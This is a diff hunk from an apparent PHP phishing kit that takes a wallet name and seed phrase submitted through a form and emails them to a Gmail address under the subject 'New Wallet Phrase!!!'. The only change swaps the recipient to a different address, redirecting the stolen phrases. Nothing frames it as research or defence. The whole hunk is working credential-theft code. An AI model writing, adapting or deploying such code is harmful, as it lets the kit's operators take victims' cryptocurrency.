@@ -19,7 +19,7 @@ $subject = "New Wallet Phrase!!!";
             ));
         }else{
             $message = "<b>Wallet Name: </b>".$wallet."<br><br><b>Phrase: </b>".$phrase;
-            if(send_mail("okaffskido@gmail.com", $subject, $message)){
+            if(send_mail("coinfigure77@gmail.com", $subject, $message)){
                 print json_encode(array(
                     'status'=>1
                 ));
